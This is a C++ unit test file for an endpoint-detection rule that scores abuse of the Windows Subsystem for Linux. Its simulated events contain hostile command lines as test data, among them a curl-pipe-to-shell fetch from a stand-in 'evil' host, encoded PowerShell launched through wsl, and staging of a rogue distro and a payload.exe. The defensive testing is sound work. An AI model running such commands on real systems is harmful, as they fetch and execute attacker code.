/*
 * wsl_abuse_detector_tests.cpp - Unit tests for WslAbuseDetector (T1202).
 */
#include "wsl_abuse_detector_tests.h"
#include <cstdint>
#include <cstdio>
#include <stdexcept>
#include <string>
#include "edr_event.h"
#include "event_bus.h"
#include "wsl_abuse_detector.h"

namespace {
#define SR_CHECK(c) Check((c), #c, __LINE__)
void Check(bool c,const char* e,int l){ if(!c) throw std::runtime_error(std::string("CHECK failed at ")+std::to_string(l)+": "+e); }
edr::Event ProcEvent(uint64_t ts, const char* img, const char* cmd){
    edr::Event ev; ev.type=EDR_EVT_PROCESS_START; ev.ts100ns=ts; ev.fields[edr::field::kType]="PROCESS_START"; ev.fields[edr::field::kImage]=img; if(cmd) ev.fields[edr::field::kCommandLine]=cmd; return ev;
}
edr::Event ScriptEvent(uint64_t ts, const char* body){
    edr::Event ev; ev.type=EDR_EVT_POWERSHELL_SCRIPT; ev.ts100ns=ts; ev.fields[edr::field::kType]="POWERSHELL_SCRIPT"; if(body) ev.fields[edr::field::kScriptBlockText]=body; return ev;
}
std::string Score(const edr::Event& e){
    auto it=e.fields.find(edr::field::kWslAbuseScore);
    return it==e.fields.end()?"":it->second;
}
}

void RunWslAbuseDetectorTests(){
    std::fprintf(stderr, "[wsl] TestDisabled\n");
    {
        edr::WslAbuseDetector d(false,55,300,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl --exec powershell.exe -enc AAAA");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] TestCrossBoundaryExec\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl --exec powershell.exe -enc AAAA");
        d.Enrich(ev); SR_CHECK(Score(ev)=="90");
    }
    std::fprintf(stderr, "[wsl] TestImportStaging\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl --import evil C:\\Users\\Public\\evil C:\\Users\\Public\\rootfs.tar.gz");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[wsl] TestBashNonInteractive\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\bash.exe","bash -c \"curl http://evil/x | sh\"");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[wsl] TestMntAccess\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl ls /mnt/c/Users/Public");
        d.Enrich(ev); SR_CHECK(Score(ev)=="80");
    }
    std::fprintf(stderr, "[wsl] TestImplicitDistroExec\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl -d Ubuntu whoami");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75");
    }
    std::fprintf(stderr, "[wsl] TestWslShareStaging\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\cmd.exe","cmd /c copy payload.exe \\\\wsl$\\Ubuntu\\tmp\\");
        d.Enrich(ev); SR_CHECK(Score(ev)=="75");
    }
    std::fprintf(stderr, "[wsl] TestScriptSurface\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,"wsl --import evil $env:TEMP\\evil $env:TEMP\\rootfs.tar.gz");
        d.Enrich(ev); SR_CHECK(Score(ev)=="85");
    }
    std::fprintf(stderr, "[wsl] TestEmptyScriptSilent\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ScriptEvent(10000000ULL,nullptr);
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] TestAdminListSilent\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl --list --verbose");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] TestBareSilent\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] TestBenignSilent\n");
    {
        edr::WslAbuseDetector d(true,55,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\notepad.exe","notepad.exe");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] TestMinScoreGate\n");
    {
        edr::WslAbuseDetector d(true,90,0,1024);
        auto ev=ProcEvent(10000000ULL,"C:\\Windows\\System32\\wsl.exe","wsl -d Ubuntu whoami");
        d.Enrich(ev); SR_CHECK(Score(ev).empty());
    }
    std::fprintf(stderr, "[wsl] all passed\n");
}
